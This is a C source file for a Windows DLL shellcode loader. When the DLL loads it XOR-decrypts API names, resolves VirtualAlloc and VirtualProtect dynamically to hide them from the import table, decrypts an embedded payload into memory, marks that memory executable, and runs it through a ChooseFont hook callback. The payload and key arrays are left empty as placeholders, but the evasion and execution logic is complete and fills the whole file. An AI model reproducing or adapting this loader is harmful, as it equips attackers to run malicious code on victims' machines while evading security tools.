#include <Windows.h>
#include <stdio.h>
#include <winternl.h>
#include <stdlib.h>


typedef LPVOID (WINAPI* fnVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL (WINAPI* fnVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
typedef HANDLE (WINAPI* fnCreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
typedef DWORD (WINAPI* fnWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);


void XOR(char* data, size_t data_len, char* key, size_t key_len) {
    int j;

    j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;

        data[i] = data[i] ^ key[j];
        j++;
    }
}


LPCSTR ConvertUnsignedCharArrayToLPCSTR(const unsigned char* src, size_t src_len)
{
    // Allocate memory for the new string (including space for null terminator)
    char* bstr = (char*)malloc(src_len + 1);
    
    // Copy the data
    memcpy(bstr, src, src_len);
    
    // Null-terminate the string
    bstr[src_len] = '\0';
    
    return bstr;
}


BOOL execute() {

    // Encrypted strings
    unsigned char buf[] = { };
    unsigned char virtual_alloc[] = { };
    unsigned char virtual_protect[] = { };
    unsigned char kernel32[] = { };
    char pl_key[] = "";
    char va_key[] = "";
    char vp_key[] = "";
    char k_key[] = "";

    // Decrypt strings
    XOR((char*)virtual_alloc, sizeof(virtual_alloc), va_key, sizeof(va_key));
    XOR((char*)virtual_protect, sizeof(virtual_protect), vp_key, sizeof(vp_key));
    XOR((char*)kernel32, sizeof(kernel32), k_key, sizeof(k_key));

    // Convert strings to LPCWSTR
    LPCSTR k32_wide = ConvertUnsignedCharArrayToLPCSTR(kernel32, sizeof(kernel32) / sizeof(kernel32[0]));
    LPCSTR va_wide = ConvertUnsignedCharArrayToLPCSTR(virtual_alloc, sizeof(virtual_alloc) / sizeof(virtual_alloc[0]));
    LPCSTR vp_wide = ConvertUnsignedCharArrayToLPCSTR(virtual_protect, sizeof(virtual_protect) / sizeof(virtual_protect[0]));
    
    // Dynamic linking to prevent some Win32 APIs from being inside IAT
    fnVirtualAlloc pVirtualAlloc = (fnVirtualAlloc)GetProcAddress(GetModuleHandleA(k32_wide), va_wide);
    fnVirtualProtect pVirtualProtect = (fnVirtualProtect)GetProcAddress(GetModuleHandleA(k32_wide), vp_wide);
        
    // Allocate memory
    PVOID payloadAddress = pVirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (payloadAddress == NULL) {
        return 1;
    }

    // Decrypt payload
    XOR((char*)buf, sizeof(buf), pl_key, sizeof(pl_key));

    // Copy payload
    memcpy(payloadAddress, buf, sizeof(buf));

    // Change protection
    DWORD oldProt = 0;
    BOOL success = pVirtualProtect(payloadAddress, sizeof(buf), PAGE_EXECUTE_READ, &oldProt);

    if (!success) {
        return 1;
    }

    // Execute payload
    CHOOSEFONT sCF = { 0 };
    sCF.lStructSize = sizeof(sCF);
    sCF.Flags = CF_ENABLEHOOK;
    sCF.lpfnHook = (LPCFHOOKPROC)payloadAddress;

    ChooseFont(&sCF);

    Sleep(1000);

}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        execute();
        break;
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
